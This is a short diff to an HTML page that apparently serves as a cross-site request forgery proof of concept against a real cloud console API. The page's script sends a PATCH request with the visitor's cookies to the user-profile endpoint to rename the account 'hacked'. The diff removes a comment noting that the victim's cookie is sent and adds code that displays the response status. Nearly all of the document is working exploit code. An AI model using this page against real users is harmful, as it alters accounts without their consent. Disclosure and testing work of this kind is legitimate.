@@ -6,7 +6,7 @@
 <script>
 fetch("https://console.neon.tech/api/v2/users/me", {
   method: "PATCH",
-  credentials: "include",  // sends the victim's cookie
+  credentials: "include",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify({
     id: "18b81f74-7623-427e-a297-d21b37d9b089",
@@ -14,6 +14,14 @@ fetch("https://console.neon.tech/api/v2/users/me", {
     last_name: "hacked"
   })
 })
+.then(res => {
+  document.getElementById("result").textContent = 
+    "Status: " + res.status + " " + res.statusText;
+})
+.catch(err => {
+  document.getElementById("result").textContent = 
+    "Error: " + err.message;
+});
 </script>
 </body>
 </html>
